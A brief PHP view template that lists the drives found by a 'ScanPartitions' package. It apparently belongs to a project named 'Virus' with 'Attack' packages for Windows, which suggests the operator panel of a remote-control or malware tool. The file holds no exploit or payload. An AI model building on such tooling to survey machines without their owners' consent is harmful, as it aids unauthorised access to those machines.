<?php

use function Kelvinho\Virus\map;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ScanPartitions\ScanPartitions $attack */

?>
<p>The partitions/drives available are:</p>
<div style="background-color: var(--surface); font-family: monospace, monospace; padding: 1px 20px">
    <?php echo implode(map($attack->getAvailableDrives(), fn($drive) => "<pre>$drive:/</pre>")); ?>
</div>
